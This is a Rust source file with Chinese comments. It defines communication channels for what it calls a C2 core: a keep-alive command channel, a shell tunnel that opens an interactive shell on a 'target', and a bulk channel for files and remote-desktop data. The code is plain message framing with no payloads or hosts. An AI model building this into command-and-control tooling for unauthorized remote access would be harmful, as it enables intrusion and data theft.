//! # 通信通道抽象
//!
//! 在传输层之上进一步划分三种不同类型的逻辑通道：
//!
//! 1. **控制通道** (`ControlChannel`) — 长连接保活 + 关键操控指令
//! 2. **Shell 隧道** (`ShellTunnel`) — 交互式 shell 双向流
//! 3. **大吞吐通道** (`BulkChannel`) — 文件/图像等高带宽数据传输

use crate::c2core::protocol::{Message, ShellType};
use crate::c2core::transport::Connection;
use std::io::{Read, Write};

// ── 通道类型枚举 ───────────────────────────────────────────────────

/// 三种逻辑通道类型
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum ChannelKind {
    /// 控制通道：心跳、命令、上报
    Control,
    /// Shell 隧道：交互式 shell
    Shell,
    /// 大吞吐通道：文件传输、远程桌面等
    Bulk,
}

// ── 控制通道 ───────────────────────────────────────────────────────

/// 控制通道 — 长连接保活 + 关键操控。
///
/// 直接基于 `Connection` 发送/接收 `Message`。
pub struct ControlChannel {
    conn: Box<dyn Connection>,
}

impl ControlChannel {
    pub fn new(conn: Box<dyn Connection>) -> Self {
        Self { conn }
    }

    /// 发送一条消息
    pub fn send(&mut self, msg: &Message) -> crate::c2core::transport::Result<()> {
        let data = crate::c2core::protocol::encode(msg)?;
        // 简单的长度前缀帧：4 字节小端长度 + 载荷
        let len = (data.len() as u32).to_le_bytes();
        self.conn.write_all(&len)?;
        self.conn.write_all(&data)?;
        self.conn.flush()?;
        Ok(())
    }

    /// 接收一条消息
    pub fn recv(&mut self) -> crate::c2core::transport::Result<Message> {
        let mut len_buf = [0u8; 4];
        self.conn.read_exact(&mut len_buf)?;
        let len = u32::from_le_bytes(len_buf) as usize;

        let mut buf = vec![0u8; len];
        self.conn.read_exact(&mut buf)?;

        Ok(crate::c2core::protocol::decode(&buf)?)
    }

    /// 获取底层连接的引用
    pub fn connection(&self) -> &dyn Connection {
        self.conn.as_ref()
    }
}

// ── Shell 隧道 ─────────────────────────────────────────────────────

/// Shell 隧道 — 在目标上打开交互式 shell 并双向转发数据。
pub struct ShellTunnel {
    shell_type: ShellType,
    /// 底层连接（与控制通道复用或独立连接）
    conn: Option<Box<dyn Connection>>,
}

impl ShellTunnel {
    pub fn new(shell_type: ShellType) -> Self {
        Self {
            shell_type,
            conn: None,
        }
    }

    pub fn shell_type(&self) -> &ShellType {
        &self.shell_type
    }

    /// 绑定到一个已建立的连接
    pub fn attach(&mut self, conn: Box<dyn Connection>) {
        self.conn = Some(conn);
    }

    /// 发送 shell 输入（服务端 -> 客户端）
    pub fn send_input(&mut self, data: &[u8]) -> crate::c2core::transport::Result<()> {
        let conn = self.conn.as_mut().unwrap();
        conn.write_all(data)?;
        conn.flush()?;
        Ok(())
    }

    /// 读取 shell 输出（客户端 -> 服务端）
    pub fn read_output(&mut self, buf: &mut [u8]) -> crate::c2core::transport::Result<usize> {
        let conn = self.conn.as_mut().unwrap();
        Ok(conn.read(buf)?)
    }
}

// ── 大吞吐通道 ─────────────────────────────────────────────────────

/// 大吞吐通道 — 用于图像、文件数据的高带宽传输。
///
/// 特点：数据块大、实时性要求较低、吞吐量优先。
pub struct BulkChannel {
    /// 当前传输标识
    transfer_name: Option<String>,
    /// 底层连接
    conn: Option<Box<dyn Connection>>,
    /// 已接收字节数
    total_received: u64,
}

impl BulkChannel {
    pub fn new() -> Self {
        Self {
            transfer_name: None,
            conn: None,
            total_received: 0,
        }
    }

    pub fn attach(&mut self, conn: Box<dyn Connection>) {
        self.conn = Some(conn);
    }

    /// 状态
    pub fn status(&self) -> (Option<&str>, u64) {
        (self.transfer_name.as_deref(), self.total_received)
    }
}

impl Default for BulkChannel {
    fn default() -> Self {
        Self::new()
    }
}
